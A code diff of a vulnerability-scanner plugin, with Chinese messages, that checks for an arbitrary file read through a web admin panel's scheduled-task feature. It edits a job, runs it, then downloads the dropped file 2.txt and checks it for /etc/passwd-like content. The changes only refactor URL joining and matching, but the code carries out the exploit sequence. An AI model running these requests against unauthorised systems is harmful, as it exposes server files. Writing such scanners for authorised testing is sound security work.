@@ -2,7 +2,8 @@
 from plugins.base import PluginBase
 from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
 from lib.colors import ok, no
-from lib.http import host_of
+from lib.http import host_of, join_url
+from lib.matcher import match_all
 from config import settings
 
 
@@ -36,7 +37,7 @@ class FileReadTimePlugin(PluginBase):
             "misfirePolicy": "1", "concurrent": "1", "status": "1", "remark": ""
         }
         try:
-            session.post(target + '/monitor/job/edit', headers=headers1, data=data1)
+            session.post(join_url(target, '/monitor/job/edit'), headers=headers1, data=data1)
         except Exception as e:
             print(no('定时任务任意文件读取（edit 异常）'))
             return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN, evidence=str(e))
@@ -52,21 +53,21 @@ class FileReadTimePlugin(PluginBase):
             'Content-Length': "7"
         }
         try:
-            session.post(target + '/monitor/job/run', headers=headers2, data={'jobId': '4'})
+            session.post(join_url(target, '/monitor/job/run'), headers=headers2, data={'jobId': '4'})
         except Exception as e:
             print(no('定时任务任意文件读取（run 异常）'))
             return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN, evidence=str(e))
 
         # Step 3：读取落地文件 2.txt
-        url2 = target + '/common/download/resource?resource=2.txt'
+        url2 = join_url(target, '/common/download/resource?resource=2.txt')
         try:
             file_install = session.get(url2).text
         except Exception as e:
             print(no('定时任务任意文件读取（读取 2.txt 异常）'))
             return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN, evidence=str(e))
 
-        # 判定 1:1 保留：'root' in t and ':/' in t
-        if 'root' in file_install and ':/' in file_install:
+        # 判定 1:1 保留：'root' 与 ':/' 同时出现（使用 match_all 统一判定）
+        if match_all(file_install, ['root', ':/']):
             print(ok('存在定时任务任意文件读取漏洞'))
             return ScanResult(kind='vuln', name=self.name, severity=self.severity,
                               status=STATUS_CONFIRMED, url=url2,
